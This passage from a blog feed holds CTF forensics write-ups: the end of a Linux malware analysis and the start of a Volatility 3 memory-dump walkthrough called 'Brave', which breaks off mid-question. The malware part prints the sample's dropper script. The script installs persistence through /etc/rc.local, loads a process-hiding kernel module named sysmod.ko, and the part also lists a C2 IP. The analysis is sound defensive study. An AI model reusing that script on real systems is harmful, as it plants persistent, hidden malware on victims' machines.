&lt;p&gt;We found this bash script that rename the malware mail and hide it in /var/mail/ directory and make it executable at the startup!&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;mv&lt;/span&gt; 1 /var/mail/mail&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;chmod&lt;/span&gt; +x /var/mail/mail&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;string&#34;&gt;&amp;quot;/var/mail/mail &amp;amp;\nsleep 1\npidof mail &amp;gt; /proc/dmesg\nexit 0&amp;quot;&lt;/span&gt; &amp;gt; /etc/rc.local&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;nohup&lt;/span&gt; /var/mail/mail &amp;gt; /dev/null 2&amp;gt;&amp;amp;1&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;mv&lt;/span&gt; 2 /lib/modules/`&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt; -r`/sysmod.ko&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;depmod -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;sysmod&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/modules&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;modprobe sysmod&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pidof mail &amp;gt; /proc/dmesg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;rm&lt;/span&gt; 3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;10- What file has the script modified so the malware will start upon reboot?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: /etc/rc.local&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;11- Where did the malware keep local files?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;/var/mail/&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;12- What is missing from ps.log?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In the ps.log we don’t find the process related to the malware (the mail executable)&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;/var/mail/mail&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;13- What is the main file that used to remove this information from ps.log?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There is another binary that moved and renamed as  &lt;code&gt;sysmod.ko&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: sysmod.ko&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;14- Inside the Main function, what is the function that causes requests to those servers?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/79houmJ.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: requestFile&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;15- One of the IP’s the malware contacted starts with 17. Provide the full IP.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;requestFile function use address array as parameters. let’s check it ! we found all the IP address. COOL !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/4NLcX9k.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 174.129.57.253&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;16- How many files the malware requested from external servers?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is easy man ! just check the other downloaded files !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/hjMszwa.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 9&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;After spending time on thinking and searching. We get the idea !&lt;br&gt;
The malware will get message form attacker servers! So let’s check some functions call that related to something like messaging ! You’ll find these functions in main !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/V4JQttO.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The function check if the parameter has these 2 values ! I want to check it&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/KSxTPRa.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;After using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it !&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/Hz6LsfB.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: nop,run&lt;/p&gt;
&lt;/div&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/09/06/CyberDefenders/brave/</guid>
            <title>CyberDefenders Writeup Brave</title>
            <link>http://example.com/2022/09/06/CyberDefenders/brave/</link>
            <pubDate>Tue, 06 Sep 2022 11:29:37 +0100</pubDate>
            <description><![CDATA[ &lt;p&gt;This CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!&lt;/p&gt;
&lt;h1 id=&#34;challenge-information&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#challenge-information&#34;&gt;#&lt;/a&gt; Challenge Information&lt;/h1&gt;
&lt;details class=&#34;info&#34;&gt;&lt;summary&gt;Description&lt;/summary&gt;&lt;div&gt;
&lt;p&gt;A memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.&lt;/p&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;Challenge Link &amp;amp; Author&lt;/p&gt;
&lt;div class=&#34;links&#34;&gt;&lt;div class=&#34;item&#34; title=&#34;Challenge Link&#34; style=&#34;--block-color:#2296fd;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=&#34; data-background-image=&#34;https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=&#34;&gt;Challenge Link&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;CyberDefenders - Brave&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;item&#34; title=&#34;Author - DFIRScience&#34; style=&#34;--block-color:#fcc11c;&#34;&gt;&lt;span class=&#34;exturl image&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==&#34; data-background-image=&#34;https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg&#34;&gt;&lt;/span&gt;
          &lt;div class=&#34;info&#34;&gt;
          &lt;span class=&#34;exturl title&#34; data-url=&#34;aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==&#34;&gt;Author - DFIRScience&lt;/span&gt;
          &lt;p class=&#34;desc&#34;&gt;DFIRScience Twitter Profile&lt;/p&gt;
          &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h1 id=&#34;walkthrough&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#walkthrough&#34;&gt;#&lt;/a&gt; Walkthrough&lt;/h1&gt;
&lt;p&gt;Memory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process&lt;br&gt;
The memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can inspect these information using  &lt;code&gt;imageinfo&lt;/code&gt;  plugin in volatility&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Kernel Base     0xf8043cc00000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DTB     0x1aa000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Symbols ........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Is64Bit True&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;IsPAE   False&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;layer_name      0 WindowsIntel32e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;memory_layer    1 FileLayer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;KdVersionBlock  0xf8043d80f368&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Major/Minor     15.19041&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MachineType     34404&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;KeNumberProcessors      4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SystemTime      2021-04-30 17:52:19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NtSystemRoot    C:\Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NtProductType   NtProductWinNt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NtMajorVersion  10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NtMinorVersion  0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PE MajorOperatingSystemVersion  10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PE MinorOperatingSystemVersion  0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PE Machine      34404&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PE TimeDateStamp        Tue Oct 11 07:04:26 1977&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  2021-04-30 17:52:19&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;2- What is the SHA256 hash value of the RAM image?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;sha256sum&lt;/span&gt; 20210430-Win10Home-20H2-64bit-memdump.mem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;3- What is the process ID of “brave.exe”?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 4856&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;4- How many established network connections were there at the time of acquisition? (number)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i &lt;span class=&#34;string&#34;&gt;&amp;quot;2021-04-30&amp;quot;&lt;/span&gt; | grep -i ESTABLISHED&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Oh wait man! Don’t count it manually, just use the magic of  &lt;code&gt;wc -l&lt;/code&gt;  !&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i &lt;span class=&#34;string&#34;&gt;&amp;quot;2021-04-30&amp;quot;&lt;/span&gt; | grep -i ESTABLISHED | &lt;span class=&#34;built_in&#34;&gt;wc&lt;/span&gt; -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer: 10&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;5- What FQDN does Chrome have an established network connection with?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;command line prompt&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Wow man! we found a single established connection with IP  &lt;code&gt;185.70.41.130&lt;/code&gt; &lt;br&gt;
I used a random website that give me the FQDN from the IP address!&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/XJSnlsS.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;note success&#34;&gt;
&lt;p&gt;Answer:  &lt;code&gt;protonmail.ch&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;6- What is the MD5 hash value of process executable for PID 6988?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let’s dump the executable of the process with pid 6988, I used to do that with  &lt;code&gt;procdump&lt;/code&gt;  plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that  &lt;code&gt;windows.pslist&lt;/code&gt;  plugin has  &lt;code&gt;--dump&lt;/code&gt;  argument that can dump the excutable of the process. Let’s do it !&lt;/p&gt;
